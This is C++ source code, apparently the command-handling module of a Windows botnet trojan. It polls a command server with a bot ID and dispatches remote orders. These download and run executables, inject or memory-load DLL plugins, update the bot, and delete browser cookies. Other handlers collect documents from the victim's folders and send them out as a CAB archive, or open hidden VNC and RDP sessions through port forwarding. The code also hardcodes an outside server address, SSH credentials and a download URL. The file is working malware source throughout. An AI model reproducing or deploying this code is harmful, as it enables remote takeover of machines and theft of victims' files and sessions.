//---------------------------------------------------------------------------
#include <windows.h>

#include "Task.h"
#include "Memory.h"
#include "Strings.h"
#include "Loader.h"
#include "BotUtils.h"
#include "GetApi.h"
#include "BotClasses.h"
#include "Config.h"
#include "Utils.h"
#include "BotHTTP.h"
#include "Inject.h"
#include "BotHosts.h"
#include "BotCore.h"
#include "Plugins.h"
#include "DllLoader.h"
#include "CabPacker.h"
#include "BotDef.h"
#include "VideoRecorder.h"
#include <shlobj.h>
#include <shlwapi.h>


/* TODO :
� ������ ������ ������ coocksol.h ��������� ��� ������� ����� �� � ��
��� ���������� �������. ������� ��� ����������������, �������
���������� �������, �� ������ ����� */
#include "coocksol.h"

#include "Modules.h"

#include "BotMonitorMsg.h"

//---------------------------------------------------------------------------
// ������� ������ ���������� ����������

#include "BotDebug.h"

namespace TASKDBGTEMPLATES
{
    #include "DbgTemplates.h"
}

#define TASKDBG TASKDBGTEMPLATES::DBGOutMessage<>


//---------------------------------------------------------------------------

typedef struct TTaskManager
{
	PCHAR URL;                  // ����� ������ ����� ������� �������
	DWORD Interval;             // �������� ��������� ������ (�����������);
	LPCRITICAL_SECTION Lock;    // ������ ������������
	PList RegisteredCommands;   // ������ ������������������ ������
	HANDLE CommandsThread;      // ����� ����������� ���������� ������
	HANDLE CommandEvent;        // ������� ���������� ����� ������� � ������
	PList CommandsList;         // ������ ������ ��������� ����������
	bool Terminated;            // ������� ���������� ������

} *PTASKMANAGER;


typedef struct TRegisteredCommand
{
   PCHAR Name;
   TCommandMethod Method;
} *PRegisteredCommand;

typedef struct TCommand
{
	PCHAR Command;
    PCHAR Args;
} *PCommand;


// ���������� ������� �����
//HANDLE GLManagerPID = NULL;
PTaskManager GlobalTaskManager = NULL;
DWORD TaslManagerProcess = 0;

//---------------------------------------------------------------------------
PTaskManager GetGlobalTaskManager(bool Initialize)
{
	// ���������� ��������� �� ���������� �������� �����
	if (IsNewProcess(TaslManagerProcess))
		GlobalTaskManager = NULL;

	if (GlobalTaskManager == NULL && Initialize)
        InitializeTaskManager(NULL, true);

	return GlobalTaskManager;
}

//---------------------------------------------------------------------------

void FreeCommand(LPVOID C)
{
	STR::Free(PCommand(C)->Command);
	STR::Free(PCommand(C)->Args);
    FreeStruct(C);
}
//----------------------------------------------------------------------------

void FreeRegisteredCommand(LPVOID C)
{
	STR::Free(PRegisteredCommand(C)->Name);
    FreeStruct(C);
}
//----------------------------------------------------------------------------


bool InitializeTaskManager(PTaskManager *Manager, bool RegisterCommands)
{
	// ������� �������� ������
	if (IsNewProcess(TaslManagerProcess))
		GlobalTaskManager = NULL;

	PTASKMANAGER M = CreateStruct(TTaskManager);
	if (M == NULL)
		return false;

	M->Lock = CreateStruct(RTL_CRITICAL_SECTION);
	pInitializeCriticalSection(M->Lock);

	if (Manager == NULL)
        Manager = &GlobalTaskManager;

	*Manager = (PTaskManager)M;

	if (RegisterCommands)
		RegisterAllCommands(*Manager, COMMAND_ALL);

	return true;
}

//----------------------------------------------------------------------------

void FreeTaskManager(PTaskManager Manager)
{
	// ���������� �������� �����
	PTASKMANAGER M;
	if (Manager != NULL)
		M = (PTASKMANAGER)Manager;
	else
	{
		M = (PTASKMANAGER)GetGlobalTaskManager(false);
		GlobalTaskManager = NULL;
	}

	if (M == NULL) return;


    StopTaskManager(Manager);
	pDeleteCriticalSection(M->Lock);
	FreeStruct(M->Lock);
    FreeStruct(M);
}

//----------------------------------------------------------------------------
PRegisteredCommand GetRegisteredCommand(PTASKMANAGER M, PCHAR CommandName)
{
	// ���� ������� �� �����
    PRegisteredCommand C;
	DWORD Count = List::Count(M->RegisteredCommands);
	for (DWORD i = 0; i < Count; i++)
	{
		C = (PRegisteredCommand)List::GetItem(M->RegisteredCommands, i);
		if (StrSame(C->Name, CommandName, false))
			return C;
	}

	return NULL;
}

//----------------------------------------------------------------------------
bool RegisterCommand(PTaskManager Manager, PCHAR CommandName, TCommandMethod Method)
{
	PTASKMANAGER M;
	if (Manager != NULL)
		M = (PTASKMANAGER)Manager;
	else
		M = (PTASKMANAGER)GetGlobalTaskManager(true);

	if (M == NULL || STR::IsEmpty(CommandName) || Method == NULL ||
		GetRegisteredCommand(M, CommandName) != NULL)
		return false;


	// ������ �������� �������
	pEnterCriticalSection(M->Lock);

	if (M->RegisteredCommands == NULL)
	{
		M->RegisteredCommands = List::Create();
		List::SetFreeItemMehod(M->RegisteredCommands, FreeRegisteredCommand);
    }

	PRegisteredCommand C = CreateStruct(TRegisteredCommand);
	if (C != NULL)
	{
		C->Name = STR::New(CommandName);
		C->Method = Method;
    }
    List::Add(M->RegisteredCommands, C);

	pLeaveCriticalSection(M->Lock);

	return C != NULL;
}
//----------------------------------------------------------------------------

DWORD WINAPI ExecuteCommandsProc(LPVOID Data)
{
	// ��������� ������ ���������� �������
	PTASKMANAGER M = (PTASKMANAGER)Data;
	PCommand Command;
	do
	{
		// ������� �������
		pWaitForSingleObject(M->CommandEvent, INFINITE);

		if (!M->Terminated)
		{
            // �������� ��������� �������
			pEnterCriticalSection(M->Lock);

			Command = (PCommand)List::Extract(M->CommandsList, 0);
			// � ������ ���� ������ ������ ���������� �������
			if (List::Count(M->CommandsList) == 0)
				pResetEvent(M->CommandEvent);

			pLeaveCriticalSection(M->Lock);

			// ��������� �������
			ExecuteCommand(NULL, Command->Command, Command->Args, false);

			FreeCommand(Command);
        }
	}
	while (!M->Terminated);
	pExitThread(0);
    return 0;
}

//----------------------------------------------------------------------------

void CreateTaskThread(PTASKMANAGER M)
{
	// ������� ����������� ������ ��� ����������� ���������� ������
	if (M->CommandsThread != NULL)
		return;
	M->CommandsList = List::Create();
	List::SetFreeItemMehod(M->CommandsList, FreeCommand);
	M->CommandEvent = pCreateEventA(NULL, true, false, NULL);
	M->CommandsThread = pCreateThread(NULL, 512, ExecuteCommandsProc, M, 0, NULL);
}
//----------------------------------------------------------------------------

bool TaskManagerSleep(PTaskManager Manager)
{
	// ������� �� ����������� ��������

	PTASKMANAGER M = NULL;
	if (Manager != NULL)
		M = (PTASKMANAGER)Manager;
	else
		M = (PTASKMANAGER)GetGlobalTaskManager(false);
	if (M == NULL || M->Terminated)
		return false;

	// ���������� ��������
	DWORD Interval = M->Interval;

	if (Interval == 0)
		Interval = GetDelay() * 60 * 1000;

	if (Interval == 0)
		Interval = 60*1000;


	// ����
	DWORD SleepTime = 0;
	while (SleepTime < Interval && !M->Terminated)
	{
		pSleep(1000);
        SleepTime += 1000;
	}

    return !M->Terminated;
}

//----------------------------------------------------------------------------

//bool StartTaskManager(PTaskManager Manager, PCHAR URL, bool InitCommands)
//{
//	/*   ��������� ���� ��������� ������  */
//
//	// �������������� �������� ���������� ������
//	PTASKMANAGER M;
//	if (Manager != NULL)
//		M = (PTASKMANAGER)Manager;
//	else
//		M = (PTASKMANAGER)GetGlobalTaskManager(true);
//
//
//	// ������������ ��������� �������
//	if (InitCommands)
//		RegisterAllCommands(M, COMMAND_ALL);
//
//	PCHAR RealURL = URL;
//	bool SelfURL = URL == NULL;
//
//	// ��������� ���� ���������
//	do
//	{
//		if (SelfURL)
//			RealURL = GetBotScriptURL(SCRIPT_TASK);
//
//		// ��������� � ��������� �������
//		if (RealURL != NULL)
//			DownloadAndExecuteCommand(M, RealURL);
//
//		if (SelfURL)
//			STR::Free(RealURL);
//		// ���� �� ���������� ��������� �������
//		if (!M->Terminated)
//	        TaskManagerSleep(M);
//
//
//	}
//	while (!M->Terminated);
//	return true;
//}

//----------------------------------------------------------------------------

void StopTaskManager(PTaskManager Manager)
{
	// �������� ������ ��������� �����
	if (Manager == NULL)
		Manager = GetGlobalTaskManager(false);
	if (Manager == NULL) return;

	PTASKMANAGER M = (PTASKMANAGER)Manager;
	pEnterCriticalSection(M->Lock);

	if (M->CommandsThread)
	{
		// ����� ��������, �������������
		M->Terminated = true;
		pSetEvent(M->CommandEvent);
		pWaitForSingleObject(M->CommandsThread, 1000);

		pCloseHandle(M->CommandEvent);
		pCloseHandle(M->CommandsThread);
		List::Free(M->CommandsList);

		M->CommandEvent = NULL;
		M->CommandsThread = NULL;
		M->CommandsList = NULL;
	}

	pLeaveCriticalSection(M->Lock);
}
//----------------------------------------------------------------------------

/*
bool DownloadCommand(PCHAR URL, PCHAR *HTMLCode)
{
	// ��������� �������/ ����� ������
	bool GenerateURL = STR::IsEmpty(URL);

	if (GenerateURL)
		URL = GetBotScriptURL(SCRIPT_TASK);

	string BotID = GenerateBotID2(GetPrefix(true).t_str());

	TASKDBG("Task", "��������� �������: \r\n\r\n URL - [%s]\r\n BotUID - [%s]", URL, BotID.t_str());

	PStrings Fields = Strings::Create();

	AddURLParam(Fields, "id", BotID.t_str());
	AddURLParam(Fields, "ver", (PCHAR)BOT_VERSION);

	THTTPResponseRec Response;
	ClearStruct(Response);

	#ifdef CryptHTTPH
		PCHAR Password = GetMainPassword();
		bool Result = CryptHTTP::Post(URL, Password, Fields, HTMLCode, &Response);
        STR::Free(Password);
	#else
    	bool Result = HTTP::Post(URL, Fields, HTMLCode, &Response);
	#endif

	if (Result)
	{

		if (Response.Code != 200)
		{
			if (HTMLCode != NULL)
			{
				STR::Free(*HTMLCode);
				*HTMLCode = NULL;
            }
			TASKDBG("Task", "��� ���� ����������� �������");
			MONITOR_MSG(BMCONST(TaskNoCommands), NULL);
		}
	}
	else
		TASKDBG("Task", "������ �������� ������. ������ ����������");

    HTTPResponse::Clear(&Response);
	Strings::Free(Fields);


	if (GenerateURL)
		STR::Free(URL);

    return Result;
}
//----------------------------------------------------------------------------

*/

bool DownloadCommand(PCHAR URL, PCHAR *HTMLCode)
{
	// ��������� �������/ ����� ������
	bool GenerateURL = STR::IsEmpty(URL);

	if (GenerateURL)
		URL = GetBotScriptURL(SCRIPT_TASK);

	string BotID = GenerateBotID2(GetPrefix(true).t_str());

	TASKDBG("Task", "��������� �������: \r\n\r\n URL - [%s]\r\n BotUID - [%s]", URL, BotID.t_str());


	TBotStrings Fields;

	Fields.AddValue("id", BotID);
//    Fields.AddValue("ver", BOT_VERSION);

	#ifdef CryptHTTPH
		TCryptHTTP HTTP;
		HTTP.Password = GetMainPassword2();
	#else
		THTTP HTTP;
	#endif

	// ��������� �������

	string Cmd;
	bool Result = HTTP.Post(URL, &Fields, Cmd);

	if (Result && !Cmd.IsEmpty())
	{
		// ��� �������������
		if (HTMLCode)
			*HTMLCode = STR::New(Cmd.t_str());
	}
	else
	{
		TASKDBG("Task", "��� ���� ����������� �������");
		MONITOR_MSG(BMCONST(TaskNoCommands), NULL);
	}

	if (GenerateURL)
		STR::Free(URL);

    return Result;
}
//----------------------------------------------------------------------------




bool DownloadAndExecuteCommand(PTaskManager Manager, PCHAR URL)
{
	// ��������� � ��������� �������

	PTASKMANAGER M;
	if (Manager != NULL)
		M = (PTASKMANAGER)Manager;
	else
		M = (PTASKMANAGER)GetGlobalTaskManager(true);


	// ��������� �������
	PCHAR Command = NULL;
	bool Result = false;

	if (DownloadCommand(URL, &Command))
	{
		if (Command != NULL)
		{
			Result = ExecuteCommand(M, Command);
			STR::Free(Command);
		}
	}

    return Result;
}
//----------------------------------------------------------------------------

void DoAfterExecuteCommand(PTASKMANAGER Manager, PCHAR Command, PCHAR Args, bool Executed)
{
	// ������� ����������� �� ���������� �������
/* 	PCHAR  prefix;
	if (Executed)
		prefix = "���������";
	else
		prefix = "�� ���������";

    DbgMsg("task", 0, "%s %s ( %s )", prefix, Command, Args);*/
}
//---------------------------------------------------------------------------



bool InvalidChar(char c)
{
	return c == 10 ||
		   c == 13 ||
		   c == 9 ||
		   c == 32;
}

bool ParseCommand(PCHAR HTML, PCHAR &Command, PCHAR &Args)
{
	// ����������� HTML ������ �� ������� � ���������
	if (HTML == NULL)
		return false;

	Args = STR::GetRightStr(HTML, " ");

	if (Args != NULL)
	{
		Command = STR::GetLeftStr(HTML, " ");
		bool Changed = false;
		// �������� ������ �������
		DWORD Len = STR::Length(Args);
		PCHAR Tmp = Args + (Len - 1);
		while (Tmp != Args && InvalidChar(*Tmp))
		{
            *Tmp = 0;
			Tmp--;
			Changed = true;
		}
		if (Changed)
		{
			Tmp = Args;
			Args = STR::New(Tmp);
			STR::Free(Tmp);
		}
	}
	else
		Command = STR::New(HTML);
    return Command != NULL;
}
//---------------------------------------------------------------------------

bool ExecuteCommand(LPVOID Manager, PCHAR HTML, bool Deferred)
{

	// ��c������� HTML � ��������� �������
	if (STR::IsEmpty(HTML))
		return false;

	PStrings S = Strings::Create();
	Strings::SetText(S, HTML);
	DWORD Count = Strings::Count(S);

	bool Res = false;
	PCHAR Command = NULL;
	PCHAR Args = NULL;
    PCHAR Line = NULL;

	for (DWORD i = 0; i < Count; i++)
	{
		Line = Strings::GetItem(S, i, false);
		//
		//  ������� ������������ � ������� ; ������������
		//
		if (!STR::IsEmpty(Line) && *Line != ';')
		{
			ParseCommand(Line, Command, Args);

			if (!STR::IsEmpty(Command))
			{
				TASKDBG("Task", "��������� �������: %s", Line);

				bool Executed = ExecuteCommand(Manager, Command, Args, Deferred);
				if (Executed)
				{
                    MONITOR_MSG(BMCONST(TaskExecCommandOk), Line);
                	TASKDBG("Task", "������� ������� ���������");
					Res = true;
				}
				else
                	MONITOR_MSG(BMCONST(TaskExecCommandEr), Line);
            }

			STR::Free2(Command);
			STR::Free2(Args);
        }
	}
	Strings::Free(S);

	return Res;
}

//---------------------------------------------------------------------------

bool ExecuteDeferredCommand(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	// �������� ������� � ������ ����������� ���������� ��������� �����
	PTASKMANAGER M =(PTASKMANAGER)Manager;
	if (M == NULL || Command == NULL)
		return false;

	pEnterCriticalSection(M->Lock);

	// ��������� �����
	CreateTaskThread(M);

	// ������ �������� � ��������� � � ������
	PCommand C = CreateStruct(TCommand);
	C->Command = STR::New(Command);
	C->Args = STR::New(Args);

	List::Add(M->CommandsList, C);
	pSetEvent(M->CommandEvent);

	//
	pLeaveCriticalSection(M->Lock);

	return true;
}
//----------------------------------------------------------------------------

TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command);
//----------------------------------------------------------------------------

bool ExecuteCommand(LPVOID Manager, PCHAR Command, PCHAR Args, bool Deferred)
{
	TASKDBG("Task", "ExecuteCommand: manager=0x%X command='%s' args='%s' defered=%d", 
		Manager,
		((Command == NULL) ? "(null)":Command),
		((Args == NULL) ? "(null)":Args),
		Deferred
		);


	// ��������� ������� Command � ����������� Args
	// � ������ ���� Deferred == true ���������� ������� ����� ��������
	// � ����� ����������
	if (Command == NULL)
		return false;

	PTASKMANAGER M;
	if (Manager != NULL)
		M = (PTASKMANAGER)Manager;
	else
		M = (PTASKMANAGER)GetGlobalTaskManager(true);


	// ���������� ����� �������
	TCommandMethod Method = GetCommandMethod(M, Command);

	TASKDBG("Task", "ExecuteCommand: GetCommandMethod return 0x%X", Method);
	if (Method == NULL)
		return false;

    // ��������� ������� � ������ ���������� ������
	if (Deferred && M != NULL)
	{
		// ���������� �� ���������� ����������
		ExecuteDeferredCommand(M, Command, Args);
		return true;
    }

	// ��������� �������
   	bool Result = Method(M, Command, Args);

	// �������� ������� ���������� �������
	DoAfterExecuteCommand(M, Command, Args, Result);


	return Result;

}
//---------------------------------------------------------------------------


//--------------------------  ����������� ������ -------------------------//

bool ExecuteDownload(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	// ��������� � ��������� ����

	if (Args == NULL)
		return false;

	PWCHAR FileName = GetTempName();

	if ( FileName)
	{
		ExecuteFile(Args, FileName);
		MemFree(FileName);
		return true;
	}

	return false;
}


bool ExecuteUpdateConfig(PTaskManager, PCHAR Command, PCHAR Args)
{
	// ��������� ���������������� ����
	if (Args == NULL)
		return false;

	#ifdef BotConfigH
//		DeleteIECookies();

		/* ������� ����� ��  ���������� ��� ���������� ������ �������� � FireFox  */

		DeleteFFCookies();
		return Config::Download(Args);
	#else
		return false;
	#endif
}

bool ExecuteUpdate(PTaskManager, PCHAR Command, PCHAR Args)
{
	// ��������� ����������
	bool Result = false;
	WCHAR *FileName = GetTempName();

	if (FileName)
	{
		if (DownloadInFile(Args, FileName ) && (DWORD)pGetFileAttributesW( FileName ) != INVALID_FILE_ATTRIBUTES )
		{
			/* TODO : ��������� ��������� ������� � ��������������� � ���� ������ */
			PCHAR Name = WSTR::ToAnsi(FileName, 0);
			Result = MakeUpdate(Name);
			STR::Free(Name);
        }
	}

	MemFree( FileName );
	return Result;
}

bool ExecuteLoadDLL(PTaskManager, PCHAR Command, PCHAR Args)
{
	// ������� �� �������� ����������
	WCHAR *FileName = GetTempName();

	if (FileName == NULL)
		return false;

	bool Result = false;
	if ( DownloadInFile(Args, FileName ) && FileExistsW(FileName))
		Result = InjectDll(FileName );

	MemFree(FileName);
	return Result;
}

bool ExecuteLoadDLLDisk(PTaskManager, PCHAR Command, PCHAR Args)
{
	char fileName[MAX_PATH];
	File::GetTempName( fileName, 0 );
	char* url = m_strstr( Args, "://" );
	BYTE* data = 0;
	DWORD size = 0;
	if( url == 0 ) //������ �� �������
		data = Plugin::Download( Args, NULL, &size, false );
	else //������ �� ����
		if( !DownloadInMem( Args, &data, &size ) )
			data = 0;
	bool res = false;
	if( data )
	{
		if( File::WriteBufferA( fileName, data, size ) == size )
		{
			HMODULE dll = (HMODULE)pLoadLibraryA(fileName);
			if( dll )
			{
				typedef void (WINAPI *tfunc)(void*);
				tfunc func = (tfunc)pGetProcAddress( dll, "PluginMain" );
				if( func )
				{
					func(0);
					res = true;
				}
			}
		}
		MemFree(data);
	}
	return res;
}

static DWORD WINAPI ProcessDocFind(void*)
{
	BOT::Initialize();

	typedef BOOL (WINAPI *typeBuildStubDllMain)(HANDLE DllHandle, DWORD Reason, LPVOID);
	BYTE* data = 0;
	DWORD size = 0;
	data = Plugin::Download( "docfind.plug", 0, &size, false );
	bool res = false;
	if( data )
	{
		//File::WriteBufferA( "c:\\docfind.plug", data, size );
		HMEMORYMODULE module = MemoryLoadLibrary(data);
		if( module )
		{
			DWORD* gAltEPOffs = (DWORD*)MemoryGetProcAddress(module, "gAltEPOffs" );
			if( gAltEPOffs )
			{
				typeBuildStubDllMain func = (typeBuildStubDllMain)gAltEPOffs[0];
				if( func )
				{
					TASKDBG( "Task", "����������� ������� docfind" );
					HANDLE hEvent = pCreateEventA( NULL, FALSE, FALSE, "Global\\_SearchComplete32" );
					func( 0, DLL_PROCESS_ATTACH, 0 );
					DWORD dwWait = (DWORD)pWaitForSingleObject( hEvent, INFINITE );
					pCloseHandle(hEvent);

					func( 0, DLL_PROCESS_DETACH, 0 );

					char path[MAX_PATH], tmpName[MAX_PATH];
					pSHGetFolderPathA( 0, CSIDL_MYDOCUMENTS,  0, 0, path );
					pPathAppendA( path, "search" );
					TASKDBG( "Task", "����� ������ ��������, ���������� ����� %s", path );
					//���������� ���� ����� �� ������
					if( !pPathIsDirectoryEmptyA(path) )
					{
						File::GetTempName(tmpName);
						HCAB cab = CreateCab(tmpName);
						AddDirToCab( cab, path, "docfind" );
						CloseCab(cab);
						TASKDBG( "Task", "����������� cab ���� %s", tmpName );
						DataGrabber::SendCabDelayed( 0, tmpName, "docfind" );
						pDeleteFileA(tmpName);
					}
					else
						TASKDBG( "Task", "����� %s ������", path );
					Directory::Delete(path);
				}
			}
			MemoryFreeLibrary(module);
		}
		MemFree(data);
	}
	return 0;
}

//��������� ������ (dll) ������� ����������� � ��������� �������� � ���������� ����� �� ���� ������
//� ������� ��������� ���������� �� ���������� ������ ������� �����, ����� ������� ����� � � �������.
//��������� � ��������� ��������, � �� � ������� ��-�� ���� ��� ������ ����� ����������� ��������
//��-�� ���� ��� ����� ��������
bool ExecuteDocFind(PTaskManager, PCHAR Command, PCHAR Args)
{
	MegaJump(ProcessDocFind);
	return true;
}


static char ipServerForRDP[16];

static DWORD WINAPI ProcessRDP(void*)
{
	typedef int (WINAPIV* PINIT) (char* config);
	typedef int (WINAPIV* PSTART)();
	typedef int (WINAPIV* PSTOP)();
	typedef int (WINAPIV* PTakeBotGuid)(char*boot_guid);

	BOT::Initialize();
	char ipServer[16];
	m_lstrcpy( ipServer, ipServerForRDP );
	TASKDBG( "Task", "Run RDP, ip %s", ipServer );
	DWORD c_data;
	BYTE* data = Plugin::Download( "rdp.plug", 0, &c_data, false );
	//BYTE* data = File::ReadToBufferA( "c:\\rdp.dll", c_data );
	if( data )
	{
		if( RunPortForward(ipServer) )
		{
			HMEMORYMODULE module = MemoryLoadLibrary(data);
			if( module )
			{
				PINIT Init = (PINIT)MemoryGetProcAddress( module, "Init" );
				PSTART Start = (PSTART)MemoryGetProcAddress( module, "Start" );
				PSTOP Stop = (PSTOP)MemoryGetProcAddress( module, "Stop" );
				PTakeBotGuid TakeBotGuid = (PTakeBotGuid)MemoryGetProcAddress( module, "TakeBotGuid" );
				if( Init )
				{
					TASKDBG( "Task", "Init RDP" );
					Init("88.198.53.14;22;445;sshu;P@ssw0rd;system_help;fixerESCONuendoZ;http://www.cushyhost.com/download.php?img=73");
					Start();
					for(;;) // ���� ������� �� ����������
					{
						HANDLE tmp;
						tmp = (HANDLE)pOpenMutexA( MUTEX_ALL_ACCESS, false, "DllStop" );
						if ((DWORD)pWaitForSingleObject( tmp, INFINITE ))
							pSleep(100);
						else
							break;
					}
					Stop();
					TASKDBG( "Task", "Stop RDP" );
					MemoryFreeLibrary(module);
				}
			}
			MemFree(data);
		}
	}
	return 0;
}

bool ExecuteRDP(PTaskManager, PCHAR Command, PCHAR Args)
{
	int len = m_lstrlen(Args);
	if( len < sizeof(ipServerForRDP) && len > 0 )
	{
		//����� IP ����� � ���������� ����������, ������� ����� ��������� ��� �������� ���� ����� �����������
		//���� � ������ �������, �. �. ����� ������� �������� �������� ��� ������ ��������
		m_memcpy( ipServerForRDP, Args, len + 1 );
		MegaJump(ProcessRDP);
		return true;
	}
	return false;
}

static char ipServerForVNC[16];

static DWORD WINAPI ProcessVNC(void*)
{
	BOT::Initialize();

	char ipServer[16];
	m_lstrcpy( ipServer, ipServerForVNC );
	TASKDBG( "Task", "Run VNC, ip %s", ipServer );
	DWORD c_data;
	BYTE* data = Plugin::Download( "vnc.plug", 0, &c_data, false );
//	BYTE* data = File::ReadToBufferA( "c:\\hvnc.exe", c_data );
	if( data )
	{
		char fileName[MAX_PATH];
		File::GetTempName(fileName);
		if( File::WriteBufferA( fileName, data, c_data ) == c_data )
		{
			TASKDBG( "Task", "vnc.plug saved in %s", fileName );
			if( RunFileA(fileName) )
			{
				pMoveFileExA( fileName, 0, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
				if( RunPortForward(ipServer) )
				{
					TASKDBG( "Task", "VNC worked" );
					pSleep(24 * 3600 * 1000);
				}
			}
			else
				pDeleteFileA(fileName);
		}
		MemFree(data);
	}
				/*
				HMEMORYMODULE module = MemoryLoadLibrary(data);
				if( module )
				{
					TASKDBG( "Task", "Exit HVNC" );
					MemoryFreeLibrary(module);
				}
				*/
	return 0;
}

bool ExecuteVNC(PTaskManager, PCHAR Command, PCHAR Args)
{
	int len = m_lstrlen(Args);
	if( len < sizeof(ipServerForVNC) && len > 0 )
	{
		//����� IP ����� � ���������� ����������, ������� ����� ��������� ��� �������� ���� ����� �����������
		//���� � ������ �������, �. �. ����� ������� �������� �������� ��� ������ ��������
		m_memcpy( ipServerForVNC, Args, len + 1 );
		MegaJump(ProcessVNC);
		return true;
	}
	return false;
}

bool ExecuteMultiDownload(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	// ��������� ������������� �������� ������
	return false;

  /*		char * cPointer= m_strstr(&Buffer[1],"http:");
		if (LoadExe==NULL)
		{

			LoadExe = (char*)MemAlloc(m_lstrlen(cPointer))+1+4;
			m_lstrncpy(LoadExe,"exe=",4);
			m_lstrcat( LoadExe, cPointer );
		}
		else
		{
			LoadExe=(char*)MemRealloc(LoadExe,m_lstrlen(cPointer)+m_lstrlen(LoadExe)+1);
			m_lstrcat( LoadExe, cPointer );
		}

		char* cUrl=Buffer;
		char* cUrlNext;
		int i;
		char *DownloadUrl;
		while (true)
		{
			cUrl= m_strstr(&cUrl[1],"http:");
			if (cUrl==NULL)break;
			cUrlNext= m_strstr(cUrl,"|");
			i=m_lstrlen(cUrl)-m_lstrlen(cUrlNext);
			DownloadUrl = (char*)MemAlloc(i)+1;
			m_lstrncpy(DownloadUrl,cUrl,i);
			DownloadUrl[i]='\0';


			if ( DownloadUrl )
			{


				WCHAR *FileName =(WCHAR *)GetTempName();

				if ( FileName && DownloadUrl )
				{
					ExecuteFile( DownloadUrl, FileName );
				}

				MemFree( FileName );
			}

			MemFree( DownloadUrl );
		}
    */

}


bool ExecuteAlert(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	// ��������� ������� alert
	pMessageBoxA(0, Args, NULL, MB_OK | MB_ICONINFORMATION);
	return true;
}

// ���� ������ ������� installfakedll
void AsyncInstallFakeDll(void* Arguments)
{
	PCHAR ParamList = (PCHAR)Arguments;

	// � ���������� ���� ������������ ����������� PlugName, BotPlugName � 
	// �������������� �������� Target
	string InstallerPlugName = GetCommandParamByIndex(ParamList, 0);
	string BotPlugName       = GetCommandParamByIndex(ParamList, 1);
	string Target            = GetCommandParamByIndex(ParamList, 2);
	
	// ����� �������� ����� ����������� ������ ������
	STR::Free(ParamList);

	// ��� ������� ����� ������ ����� � ������ ��������
	STR::AnsiLowerCase(InstallerPlugName.t_str());

	TASKDBG("AsyncInstallFakeDll", "Started with InstallerPlugName='%s' BotPlugName='%s' Target='%s'",
		InstallerPlugName.t_str(),
		BotPlugName.t_str(),
		Target.t_str()
		);

	DWORD  InstallerPlugSize = 0;
	LPBYTE InstallerPlug = Plugin::DownloadEx(InstallerPlugName.t_str(), NULL, &InstallerPlugSize, true, false, NULL);
	TASKDBG("AsyncInstallFakeDll", "Download() return body=0x%X size=%d", InstallerPlug, 
		InstallerPlugSize);

	do
	{
		TASKDBG("AsyncInstallFakeDll", "check is plug loaded from network");
		// ��������� ���������� �� ����
		if (InstallerPlug == NULL) break;

		// ��������� ������ (PE)
		TASKDBG("AsyncInstallFakeDll", "check file from network for PE");
		if (!IsExecutableFile(InstallerPlug)) break;

		HMEMORYMODULE Module = MemoryLoadLibrary(InstallerPlug);
		TASKDBG("AsyncInstallFakeDll", "MemoryLoadLibrary() result=0x%X", Module);
		if (Module == NULL) break;

		// Installer.plug ������ ������������� �-��� Install(target, body, size).
		typedef BOOL (WINAPI *FakeInstallFunction)(
			const char* BotPlugName, 
			const char* Target, 
			const void* InstallerBody, 
			DWORD InstallerBodySize
			);

		// �������� � ��������� �-��� FakeInstall
		FakeInstallFunction FakeInstall = (FakeInstallFunction)MemoryGetProcAddress(Module, "FakeInstall");
		TASKDBG("AsyncInstallFakeDll", "MemoryGetProcAddress('FakeInstall') result=0x%X", FakeInstall);
		
		if (FakeInstall == NULL) break;

		TASKDBG("AsyncInstallFakeDll", "running FakeInstall.");
		BOOL FakeInstallResult = FakeInstall(BotPlugName.t_str(), Target.t_str(), 
			InstallerPlug, InstallerPlugSize);
		
		TASKDBG("AsyncInstallFakeDll", "Installation result=%d.", FakeInstallResult);

		// TODO: �� ���� ��� ���� ������� �����-�� ����� � ���������� ���������� �������.
	}
	while (0);

	TASKDBG("AsyncInstallFakeDll", "Finished.");
	if (InstallerPlug) MemFree(InstallerPlug);
}


// ������� ���������� � ������� ��������� FakeAutorunDll
// �������: installfakedll <InstallerName.plug> <BuildedBotPlugName.plug> [<Target>]
// <InstallerName.plug> - ��� ����������� �� �������
//
// <BuildedBotPlugName.plug> - ��� ������� ��� �� ����������� ����������� ��� ����������� � �������.
//
// <Target> - �������������� ��������. ��������� ���������� ���� ���������. ���� ������ �� ������� 
//            �������� �� ��� ��������� ����, ������� ������������ ����������.

bool ExecuteInstallFakeDll(void* Manager, PCHAR Command, PCHAR Args)
{
	TASKDBG("ExecuteInstallFakeDll", "Args: '%s'", Args);

	PCHAR ParamList = STR::New(Args);

	StartThread(AsyncInstallFakeDll, ParamList);
	return true;
}



//---------------------------------------------------------------------------


TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
{
    // ��������� ����������� �������

	const static char CommandUpdate[]        = {'u','p','d','a','t','e',0};
	const static char CommandUpdateConfig[]  = {'u','p','d','a','t','e','c','o','n','f','i','g' ,0};
	const static char CommandDownload[]      = {'d','o','w','n','l','o','a','d',0};
	const static char CommandLoadDll[]       = {'l','o','a','d','d','l','l',0};
	const static char CommandAlert[]         = {'a', 'l', 'e', 'r', 't', 0};
	const static char CommandUpdateHosts[]   = {'u', 'p', 'd', 'a', 't', 'e', 'h', 'o', 's', 't', 's',  0};
	const static char CommandLoadDLLDisk[]	 = {'l','o','a','d','d','l','l','d','i','s','k', 0};
	const static char CommandDocFind[]		 = {'d','o','c','f','i','n','d', 0};
	const static char CommandRDP[]			 = {'r','d','p', 0};
	const static char CommandVNC[]			 = {'v','n','c', 0};

	int Index = StrIndexOf( Command, false, 10,
							(PCHAR)CommandUpdate,
							(PCHAR)CommandUpdateConfig,
							(PCHAR)CommandDownload,
							(PCHAR)CommandLoadDll,
							(PCHAR)CommandAlert,
							(PCHAR)CommandUpdateHosts,
							(PCHAR)CommandLoadDLLDisk,
							(PCHAR)CommandDocFind,
							(PCHAR)CommandRDP,
							(PCHAR)CommandVNC
						  );


	switch (Index)
	{
		case 0: return ExecuteUpdate;
		case 1: return ExecuteUpdateConfig;
		case 2: return ExecuteDownload;
		case 3: return ExecuteLoadDLL;
		case 4: return ExecuteAlert;
		case 5: return Hosts::ExecuteUpdateHostsCommand;
		case 6: return ExecuteLoadDLLDisk;
		case 7: return ExecuteDocFind;
		case 8: return ExecuteRDP;
		case 9: return ExecuteVNC;

    default: ;
	}

